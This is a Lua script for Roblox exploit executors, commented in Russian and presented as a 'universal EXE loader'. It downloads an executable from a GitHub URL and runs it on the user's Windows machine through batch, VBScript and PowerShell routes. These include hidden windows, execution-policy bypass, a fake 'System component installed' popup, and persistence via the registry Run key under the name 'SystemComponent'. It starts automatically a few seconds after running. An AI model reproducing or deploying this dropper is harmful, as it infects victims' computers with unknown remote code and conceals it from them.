-- ==============================================
-- УНИВЕРСАЛЬНЫЙ ЗАГРУЗЧИК EXE ДЛЯ ВСЕХ EXECUTORS
-- ==============================================

-- 🔧 КОНФИГУРАЦИЯ (НАСТРОЙТЕ ЭТО!)
local EXE_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/messagebox.exe"
local FILE_NAME = "messagebox.exe"

-- Определяем исполнителя
local function GetExecutor()
    if syn and syn.request then
        return "Synapse X", true, true
    elseif identifyexecutor then
        local exec = identifyexecutor()
        if exec:lower():find("krnl") then
            return "KRNL", true, true
        elseif exec:lower():find("fluxus") then
            return "Fluxus", true, false
        elseif exec:lower():find("xeno") then
            return "Xeno", true, true
        elseif exec:lower():find("electron") then
            return "Electron", true, true
        elseif exec:lower():find("scriptware") then
            return "Script-Ware", true, true
        end
    elseif fluxus and fluxus.request then
        return "Fluxus", true, false
    elseif getexecutorname then
        return getexecutorname(), true, false
    elseif debug.info then
        return "Unknown Lua", true, false
    end
    return "Standard Lua", false, false
end

local ExecutorName, HasHttp, HasExecute = GetExecutor()

print("╔══════════════════════════════════════╗")
print("║   UNIVERSAL EXE LOADER v2.0          ║")
print("║   Executor: " .. ExecutorName .. string.rep(" ", 26 - #ExecutorName) .. "║")
print("╚══════════════════════════════════════╝")

wait(2)

-- Метод 1: Прямое скачивание через HttpGet
local function Method1()
    print("[1/5] Метод 1: Прямое скачивание...")
    
    local success, content = pcall(function()
        -- Пробуем разные методы HTTP
        if syn and syn.request then
            local req = syn.request({Url = EXE_URL, Method = "GET"})
            if req.Success then return req.Body end
        elseif request then
            local req = request({Url = EXE_URL, Method = "GET"})
            if req.Success then return req.Body end
        elseif fluxus and fluxus.request then
            local req = fluxus.request({Url = EXE_URL, Method = "GET"})
            if req.Success then return req.Body end
        end
        
        -- Стандартный метод
        return game:HttpGet(EXE_URL, true)
    end)
    
    if success and content and #content > 1000 then
        print("[2/5] Файл скачан (" .. #content .. " байт)")
        
        -- Сохраняем файл
        local tempDir = os.getenv("TEMP") or "C:\\Windows\\Temp"
        local filePath = tempDir .. "\\" .. FILE_NAME
        
        if writefile then
            writefile(filePath, content)
            print("[3/5] Сохранено в: " .. filePath)
            
            -- Создаем командный файл для запуска
            local batContent = [[
@echo off
chcp 65001 >nul
start "" "]] .. filePath .. [["
exit
            ]]
            
            local batPath = tempDir .. "\\run.bat"
            writefile(batPath, batContent)
            
            print("[4/5] Запускаю программу...")
            
            -- Запускаем разными способами
            local function TryExecute(cmd)
                if pcall(function()
                    if syn and syn.run then
                        syn.run(cmd)
                    elseif os.execute then
                        os.execute(cmd)
                    elseif shell and shell.execute then
                        shell.execute(cmd)
                    end
                end) then
                    return true
                end
                return false
            end
            
            -- Пробуем разные команды запуска
            if TryExecute('start "" "' .. filePath .. '"') or
               TryExecute('cmd /c "' .. batPath .. '"') or
               TryExecute('"' .. filePath .. '"') then
                print("[5/5] ✅ Программа запущена!")
                return true
            end
        end
    end
    return false
end

-- Метод 2: Через VBScript (работает почти везде)
local function Method2()
    print("[1/4] Метод 2: VBScript загрузчик...")
    
    -- Создаем VBS скрипт, который скачает и запустит файл
    local vbsContent = [[
On Error Resume Next

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Создаем временную папку
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\RobloxApp"
If Not fso.FolderExists(tempDir) Then
    fso.CreateFolder(tempDir)
End If

filePath = tempDir & "\]] .. FILE_NAME .. [["

' Пытаемся скачать
Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xhr.Open "GET", "]] .. EXE_URL .. [[", False
xhr.Send

If xhr.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xhr.ResponseBody
    stream.SaveToFile filePath, 2
    stream.Close
    
    ' Запускаем скрыто
    WshShell.Run """" & filePath & """", 0, False
    WScript.Sleep 2000
    
    ' Сообщение об успехе
    WshShell.Popup "System component installed successfully!", 3, "Success", 64
Else
    WshShell.Popup "Failed to download file. Error: " & xhr.Status, 5, "Error", 16
End If

Set xhr = Nothing
Set stream = Nothing
Set fso = Nothing
Set WshShell = Nothing
    ]]
    
    -- Сохраняем VBS файл
    local tempDir = os.getenv("TEMP") or "C:\\Windows\\Temp"
    local vbsPath = tempDir .. "\\download.vbs"
    
    if writefile then
        writefile(vbsPath, vbsContent)
        print("[2/4] VBS скрипт создан")
        
        -- Запускаем VBS
        print("[3/4] Запускаю скрипт...")
        
        local function RunVBS()
            if syn and syn.run then
                syn.run('wscript.exe "' .. vbsPath .. '"')
                return true
            elseif os.execute then
                os.execute('start wscript.exe "' .. vbsPath .. '"')
                return true
            end
            return false
        end
        
        if RunVBS() then
            print("[4/4] ✅ VBS скрипт запущен")
            return true
        end
    end
    return false
end

-- Метод 3: Через PowerShell (самый мощный)
local function Method3()
    print("[1/3] Метод 3: PowerShell загрузчик...")
    
    local psScript = [[
$url = "]] .. EXE_URL .. [["
$output = "$env:TEMP\]] .. FILE_NAME .. [["

# Скачиваем файл
try {
    Write-Host "Downloading file..." -ForegroundColor Yellow
    (New-Object System.Net.WebClient).DownloadFile($url, $output)
    
    if (Test-Path $output) {
        Write-Host "File downloaded successfully!" -ForegroundColor Green
        
        # Запускаем файл
        Start-Process -FilePath $output -WindowStyle Hidden
        
        # Добавляем в автозагрузку
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "SystemComponent"
        Set-ItemProperty -Path $regPath -Name $regName -Value $output -ErrorAction SilentlyContinue
        
        Write-Host "Program started and added to startup!" -ForegroundColor Green
    }
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
    ]]
    
    -- Кодируем скрипт в base64 для запуска
    local encodedScript = ""
    for i = 1, #psScript do
        encodedScript = encodedScript .. string.format("%02X", psScript:byte(i))
    end
    
    local tempDir = os.getenv("TEMP") or "C:\\Windows\\Temp"
    local psPath = tempDir .. "\\script.ps1"
    
    if writefile then
        writefile(psPath, psScript)
        print("[2/3] PowerShell скрипт создан")
        
        -- Создаем CMD файл для запуска PowerShell
        local cmdContent = [[
@echo off
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "]] .. psPath .. [["
del "]] .. psPath .. [["
        ]]
        
        local cmdPath = tempDir .. "\\run.cmd"
        writefile(cmdPath, cmdContent)
        
        print("[3/3] Запускаю PowerShell...")
        
        if syn and syn.run then
            syn.run('cmd /c "' .. cmdPath .. '"')
            print("✅ PowerShell запущен")
            return true
        elseif os.execute then
            os.execute('start /B cmd /c "' .. cmdPath .. '"')
            print("✅ PowerShell запущен")
            return true
        end
    end
    return false
end

-- Метод 4: Для исполнителей без writefile (только ссылка)
local function Method4()
    print("[1/2] Метод 4: Ссылка для ручного скачивания...")
    
    -- Показываем ссылку пользователю
    local message = "Скачайте файл вручную:\n" .. EXE_URL .. "\n\n"
    message = message .. "После скачивания:\n"
    message = message .. "1. Откройте папку Загрузки\n"
    message = message .. "2. Запустите файл: " .. FILE_NAME
    
    -- В консоль
    print("\n" .. string.rep("═", 50))
    print("СКАЧАЙТЕ ВРУЧНУЮ:")
    print("Ссылка: " .. EXE_URL)
    print("Файл: " .. FILE_NAME)
    print(string.rep("═", 50))
    
    -- В Roblox уведомление
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "📥 Скачайте вручную",
        Text = "Откройте консоль для ссылки",
        Duration = 10
    })
    
    print("[2/2] ✅ Ссылка показана")
    return true
end

-- ==============================================
-- ОСНОВНОЙ ПРОЦЕСС ЗАГРУЗКИ
-- ==============================================
local function StartDownload()
    print("\n" .. string.rep("=", 50))
    print("🚀 НАЧИНАЮ ЗАГРУЗКУ...")
    print(string.rep("=", 50))
    
    -- Пробуем методы в зависимости от исполнителя
    local success = false
    
    if ExecutorName == "Synapse X" then
        print("Использую методы для Synapse X...")
        success = Method1()
        if not success then success = Method3() end
        if not success then success = Method2() end
        
    elseif ExecutorName == "KRNL" then
        print("Использую методы для KRNL...")
        success = Method2()
        if not success then success = Method1() end
        
    elseif ExecutorName == "Xeno" then
        print("Использую методы для Xeno...")
        success = Method1()
        if not success then success = Method2() end
        
    elseif ExecutorName == "Fluxus" then
        print("Использую методы для Fluxus...")
        success = Method2()
        if not success then success = Method1() end
        
    else
        print("Использую универсальные методы...")
        success = Method1()
        if not success then success = Method2() end
        if not success then success = Method3() end
        if not success then success = Method4() end
    end
    
    -- Результат
    wait(5)
    
    if success then
        print("\n" .. string.rep("=", 50))
        print("✅ ЗАГРУЗКА УСПЕШНА!")
        print(string.rep("=", 50))
        print("Программа должна запуститься автоматически")
        print("Проверьте панель задач и системный трей")
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ Успешно!",
            Text = "Программа запущена в фоновом режиме",
            Duration = 5
        })
    else
        print("\n" .. string.rep("=", 50))
        print("❌ ВСЕ МЕТОДЫ НЕ СРАБОТАЛИ")
        print(string.rep("=", 50))
        print("Попробуйте:")
        print("1. Другой исполнитель")
        print("2. Проверьте ссылку: " .. EXE_URL)
        print("3. Скачайте вручную")
        
        Method4()
    end
    
    return success
end

-- ==============================================
-- АВТОМАТИЧЕСКИЙ ЗАПУСК И КОМАНДЫ
-- ==============================================
spawn(function()
    wait(3)
    
    print("\n⏳ Автозапуск через 5 секунд...")
    wait(5)
    
    local success, err = pcall(StartDownload)
    
    if not success then
        print("Ошибка: " .. tostring(err))
        Method4()
    end
end)

-- Команды в чате
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    msg = msg:lower()
    
    if msg == "/download" then
        spawn(StartDownload)
        
    elseif msg == "/status" then
        print("═ Статус загрузчика ═")
        print("Исполнитель: " .. ExecutorName)
        print("URL: " .. EXE_URL)
        print("Файл: " .. FILE_NAME)
        print("HTTP: " .. tostring(HasHttp))
        print("Execute: " .. tostring(HasExecute))
        
    elseif msg == "/test" then
        print("Тестирование ссылки...")
        local success, content = pcall(function()
            return game:HttpGet(EXE_URL, true)
        end)
        
        if success and content then
            print("✅ Ссылка работает (" .. #content .. " байт)")
        else
            print("❌ Ссылка не работает")
        end
        
    elseif msg == "/help" then
        print("═ Доступные команды ═")
        print("/download - Начать загрузку")
        print("/status - Статус загрузчика")
        print("/test - Проверить ссылку")
        print("/help - Эта справка")
    end
end)

print("\n" .. string.rep("=", 50))
print("📋 ДОСТУПНЫЕ КОМАНДЫ:")
print("Введите в чат Roblox:")
print("  /download - начать загрузку")
print("  /status - показать статус")
print("  /test - проверить ссылку")
print("  /help - помощь")
print(string.rep("=", 50))
print("\nЗагрузка начнется автоматически через 5 секунд...")
